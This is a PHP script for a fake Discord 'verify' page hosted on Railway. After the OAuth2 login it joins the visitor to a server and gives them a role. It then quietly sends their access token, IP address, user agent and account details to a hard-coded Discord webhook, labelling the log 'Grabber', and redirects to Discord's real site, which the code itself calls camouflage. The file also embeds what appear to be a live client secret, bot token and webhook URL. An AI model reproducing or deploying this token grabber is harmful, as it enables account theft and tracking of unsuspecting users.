<?php
// Railwayの生存確認
if ($_SERVER['REQUEST_URI'] === '/health') {
    http_response_code(200);
    exit('OK');
}

// --- 設定データ（すべて統合済み） ---
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 

// あなたのサーバー情報
$bot_token     = 'EU68hOVOglZRqbLdfLLpYFq1y8Ra6qZc'; // 送信されたトークン
$guild_id      = '1483346769025831035';           // Server ID
$role_id       = '1483424484043260024';           // Role ID

if (!isset($_GET['code'])) {
    echo "Ready. Please use the OAuth2 link.";
    exit;
}

// 1. アクセストークンの取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = json_decode(curl_exec($ch), true);

if (isset($token_res['access_token'])) {
    $access_token = $token_res['access_token'];

    // 2. ユーザー情報の取得
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $access_token]);
    $user = json_decode(curl_exec($ch), true);

    // 3. サーバーに参加 ＆ ロール付与 (PUTリクエスト)
    $data = json_encode([
        'access_token' => $access_token,
        'roles'        => [$role_id]
    ]);

    $ch = curl_init("https://discord.com/api/guilds/{$guild_id}/members/{$user['id']}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bot {$bot_token}",
        "Content-Type: application/json"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $join_res = curl_exec($ch);

    // 4. 情報取得（Grabber）ログ作成
    $time = date("Y/m/d H:i:s");
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $creation_date = date("Y/m/d H:i:s", (($user['id'] >> 22) + 1420070400000) / 1000);

    // あなたが指定したフォーマット
    $content = "```autohotkey\n";
    $content .= "TokenDetected!!\n\n";
    $content .= "Time: " . $time . "\n";
    $content .= "Device: " . $ua . "\n";
    $content .= "UserID: " . $user['id'] . " (" . $user['username'] . ")\n";
    $content .= "IP Address: " . $ip . "\n";
    $content .= "Country: Unknown (Via IP)\n";
    $content .= "Token: " . $access_token . "\n";
    $content .= "AccountCreationDate: " . $creation_date . "\n";
    $content .= "RoleAdded: Success\n";
    $content .= "```";

    // Discord Webhookへ送信
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["content" => $content]));
    curl_exec($ch);
}

// 完了後はDiscord公式へ（カモフラージュ）
header("Location: https://discord.com/channels/@me");
exit;
